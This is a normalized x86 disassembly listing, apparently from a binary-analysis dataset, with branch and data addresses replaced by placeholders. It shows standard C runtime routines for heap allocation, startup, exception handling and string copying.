ja r-xdata
push 0x4
pop ecx
and [ eax + 0xc ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
retn 0x8
push 0x40
pop edx
sub_40f549
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
pop esi
retn
push [ esi ]
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_40f009
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add eax 0x4
dec ecx
imul edx ecx
add eax edx
jmp r-xdata
test ecx ecx
jge r-xdata
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
dec ecx
sub eax [ esi ]
sub_40f598
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_41350f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4133af
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40f613
push 0xc
push r--data
call sub_4106dc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_410721
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_414275
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_411077
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41103c
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f669
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_4142a0
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_40f6a1
push 0xc
push r--data
call sub_4106dc
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_411077
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_410721
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_414d36
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_414a49
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f79d
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_4109d0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_40f7bf
push 0xc
push r--data
call sub_4106dc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_410721
retn
push 0x4
call sub_4141fc
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_414a49
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f805
sub_40f80e
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_414d36
pop ecx
call sub_411077
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_414ef8
push 0x1e
call sub_414d58
push 0xff
call sub_412fb7
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_40f7bf
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_411077
mov [ eax ] edi
push ebp
call sub_414d36
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_411077
mov [ eax ] edi
sub_40f8e7
push 0x10
push r--data
call sub_4106dc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40f80e
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_40f613
pop ecx
jmp r-xdata
call sub_410721
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_414d36
pop ecx
call sub_411077
push 0x4
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_414275
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fa2b
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_41476a
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_414d36
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_414a49
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_411077
call sub_411077
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_414d36
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41103c
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_411077
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_411077
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_415190
push ebx
call sub_414275
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_4142a0
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41103c
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_415190
push ebx
push [ ebp - 0x20 ]
call sub_4142a0
add esp 0x14
mov eax esi
sub_40fb02
mov ecx [ esp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jbe r-xdata
imul ecx [ esp + 0x10 ]
push ecx
push [ esp + 0xc ]
call sub_40f8e7
pop ecx
pop ecx
pop esi
retn
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ esp + 0x10 ]
jae r-xdata
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0xc
call sub_413fad
add esp 0x14
xor eax eax
pop esi
retn
sub_40fbe1
cmp [ __dos_header ] 0x5a4d
jne r-xdata
xor eax eax
retn
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
cmp [ eax + r--data ] 0x10b
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
xor ecx ecx
cmp [ eax + __coff_header ] ecx
setne cl
mov eax ecx
retn
sub_40fc22
push 0x60
push r--data
call sub_4106dc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x70 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov edi 0x94
push edi
push 0x0
mov ebx [ GetProcessHeap@IAT ]
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esi ] edi
push esi
call [ GetVersionExA@IAT ]
push esi
push 0x0
test eax eax
jne r-xdata
push 0x12
call sub_40fbbd
mov eax [ esi + 0x10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov edi [ esi + 0xc ]
and edi 0x7fff
call ebx
push eax
call [ HeapFree@IAT ]
mov esi [ ebp - 0x20 ]
cmp esi 0x2
je r-xdata
call ebx
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov eax ecx
shl eax 0x8
mov edx [ ebp - 0x28 ]
add eax edx
mov [ rw-data ] esi
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] edi
call sub_40fbe1
mov [ ebp - 0x20 ] eax
xor ebx ebx
inc ebx
push ebx
call sub_41402c
pop ecx
test eax eax
jne r-xdata
or edi 0x8000
mov eax 0xff
call sub_4158a4
test eax eax
jne r-xdata
push 0x1c
call sub_40fbbd
call sub_416395
mov [ ebp - 0x4 ] ebx
call sub_416155
test eax eax
jge r-xdata
push 0x10
call sub_40fbbd
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_416020
mov [ rw-data ] eax
call sub_415f67
test eax eax
jge r-xdata
push 0x1b
call sub_412f6d
pop ecx
call sub_415cf4
test eax eax
jge r-xdata
push 0x8
call sub_412f6d
pop ecx
push ebx
call sub_413089
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_412f6d
pop ecx
call sub_415c97
test [ ebp - 0x44 ] bl
je r-xdata
push eax
call sub_412f6d
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x40 ]
jmp r-xdata
call sub_41320b
jmp r-xdata
push eax
call sub_4131e9
push ecx
push eax
push 0x0
push __dos_header
call sub_405230
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_410721
retn
sub_40fdc3
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
call sub_41321a
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_4131fa
call sub_410721
retn
sub_40fe0c
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
test eax eax
pop edi
mov [ ebp - 0x4 ] eax
pop esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40fe56
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40fe8d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40fedf
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4170c8
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40ff15
push esi
cld
mov esi [ esp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40f589
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ esp + 0x24 ]
push [ esi + 0x10 ]
push [ esp + 0x24 ]
call sub_4170c8
add esp 0x20
pop esi
retn
sub_40ff45
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_41001a
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_41576b
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_41001a
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40f589
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_4170c8
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40ff45
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40fe8d
pop ebx
leave
retn
sub_4100b7
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_4171f8
call sub_4171f8
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_410152
call sub_41576b
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_410173
push esi
call sub_41576b
mov esi [ esp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_41576b
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_41576b
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
pop esi
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
jmp sub_4171f8
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
pop esi
retn
mov eax ecx
sub_4101bf
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40ff15
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_417240
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41021d
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410250
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410286
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4102fa
push ecx
push ebx
push ebp
push esi
push edi
push [ rw-data ]
call sub_415561
push [ rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
call sub_415561
mov edi eax
cmp edi esi
pop ecx
pop ecx
jb r-xdata
xor eax eax
mov ebx edi
sub ebx esi
lea ebp [ ebx + 0x4 ]
cmp ebp 0x4
jb r-xdata
push esi
call sub_412eca
mov esi eax
cmp esi ebp
pop ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov [ edi ] esi
add edi 0x4
push edi
call sub_4154f5
mov [ rw-data ] eax
pop ecx
mov eax esi
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push [ esp + 0x14 ]
call sub_417521
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
push [ esp + 0x14 ]
call sub_417521
test eax eax
pop ecx
pop ecx
je r-xdata
sar ebx 0x2
push eax
lea edi [ eax + ebx * 4 ]
call sub_4154f5
pop ecx
mov [ rw-data ] eax
sub_4103a7
push esi
push 0x4
push 0x20
call sub_4174d9
mov esi eax
push esi
call sub_4154f5
add esp 0xc
test esi esi
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4103d6
push 0xc
push r--data
call sub_4106dc
call sub_412fcc
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4102fa
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41040c
mov eax [ ebp - 0x1c ]
call sub_410721
retn
sub_410424
push ebp
mov ebp esp
sub esp 0x20
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_410491
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
cmp edi eax
mov [ ebp - 0x1c ] eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
cmp esi ebx
mov [ ebp + 0x14 ] eax
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4133af
cmp eax 0xffffffff
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_41055b
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_411077
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_41765d
call sub_410491
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_411077
mov [ eax ] 0x22
sub_4105fc
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_4109d0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_415190
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
sub_410677
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
sub_4106dc
push sub_410740
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_410740
sub esp 0x14
push ebx
